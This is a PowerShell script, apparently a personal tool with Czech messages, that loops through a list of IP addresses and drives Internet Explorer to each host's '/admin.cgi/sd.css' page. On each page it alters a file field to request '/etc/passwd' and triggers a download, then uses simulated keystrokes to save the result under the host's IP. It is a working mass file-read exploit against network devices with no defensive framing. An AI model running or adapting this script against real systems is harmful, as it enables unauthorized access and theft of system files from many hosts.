$source = 'C:\Users\Vojtěch\Desktop\script\outip.txt'
$delka = (Get-Content $source).Length
[void] [System.Reflection.Assembly]::LoadWithPartialName("'System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("'Microsoft.VisualBasic")
Add-Type -Assembly "Microsoft.VisualBasic"

$ie=New-Object -comobject InternetExplorer.Application 
$ie.visible=$true 

for($i = 201;$i -le ($delka-1); $i++ )
{
$ip = (Get-Content $source)[$i]
$ipd = $ip + "/admin.cgi/sd.css"
$ie.Navigate($ipd) 
while($ie.busy){Start-Sleep 0.5} 
$ie.Document.getElementById("file").name="test" 
try
{
$ie.Document.getElementById("file").value="/etc/passwd" 
}catch{
echo $ip"Nejde"
break
}
while($ie.busy){Start-Sleep 0.5}
try
{

$Link=$ie.Document.getElementsByTagName("input") | where-object {$_.value -eq "Download!"}
$Link.click();
}catch{
 write-host "fail"
}
sleep(1)

$ie.[System.Windows.Forms.SendKeys]::Sendwait("{F6}");
$ie.[System.Windows.Forms.SendKeys]::Sendwait("{Down}");
$ie.[System.Windows.Forms.SendKeys]::Sendwait("{Down}");
$ie.[System.Windows.Forms.SendKeys]::Sendwait("{Enter}"); 
sleep(1)
[System.Windows.Forms.SendKeys]::Sendwait($ip); 
[System.Windows.Forms.SendKeys]::Sendwait("{Enter}");
echo $i
}   